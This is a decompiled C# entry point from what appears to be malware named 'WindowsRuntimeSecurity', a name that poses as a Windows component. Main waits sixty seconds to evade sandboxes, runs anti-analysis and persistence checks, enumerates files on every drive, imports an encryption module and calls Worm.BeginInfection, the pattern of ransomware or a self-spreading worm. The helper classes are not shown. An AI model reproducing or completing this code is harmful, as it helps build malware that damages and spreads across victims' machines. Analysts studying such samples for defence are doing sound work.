using System;
using System.IO;
using System.Threading;
using WindowsRuntimeSecurity.Encrypter;
using WindowsRuntimeSecurity.MiscMethods;

namespace WindowsRuntimeSecurity
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000258
		private static void Main(string[] args)
		{
			Thread.Sleep(60000);
			AntiAnalysis.IsAnalyzed();
			if (Persistence.AlreadyRunning())
			{
				Environment.Exit(1);
			}
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				try
				{
					DirectoryAndFileDiscovery.SearchFilesAndDirectories(driveInfo.Name.ToString());
				}
				catch
				{
				}
			}
			Worm.BeginInfection();
		}
	}
}
